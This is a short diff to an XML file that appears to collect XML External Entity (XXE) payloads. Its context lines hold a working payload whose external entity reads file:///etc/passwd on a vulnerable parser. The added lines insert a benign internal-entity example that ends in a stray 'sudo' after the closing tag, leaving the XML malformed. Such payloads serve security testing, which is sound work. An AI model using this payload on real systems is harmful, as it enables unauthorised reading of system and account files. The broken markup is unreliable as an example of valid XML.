@@ -3,3 +3,10 @@
 	<!ENTITY read SYSTEM 'file:///etc/passwd'>
 ]>
 <root>&read;</root>
+<!DOCTYPE replace [
+	<!ENTITY name "feast">
+]>
+<userInfo>
+	<firstName>falcon</firstName>
+	<lastName>&name;</lastName>
+</userInfo>sudo
